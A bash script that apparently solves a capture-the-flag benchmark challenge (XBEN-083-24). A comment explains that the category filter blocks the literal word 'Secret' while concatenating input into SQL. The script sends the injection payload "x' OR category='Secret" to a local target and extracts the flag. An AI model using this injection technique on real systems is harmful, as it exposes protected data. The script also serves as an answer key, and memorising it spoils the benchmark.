#!/usr/bin/env bash
# XBEN-083-24 — "The secret category" (tags: sqli)
#
# The category filter refuses the value `Secret` by name and then concatenates
# whatever is left into the query. The refusal is a string comparison on the
# input; the query is built from the same input afterwards. So a value that is
# not literally `Secret` but selects the Secret rows walks straight past it.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben083-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
REPLAY="$("$H5I" websec replay req_0 --create --set 'path=/index.php' \
    --set "query.category=x' OR category='Secret" --session "$SESSION" |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec match "res_$REPLAY" --regex 'FLAG\{[a-f0-9]{64}\}' --session "$SESSION" |
    python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["conditions"][0]["captures"][0] if d["matched"] else "no flag found")'
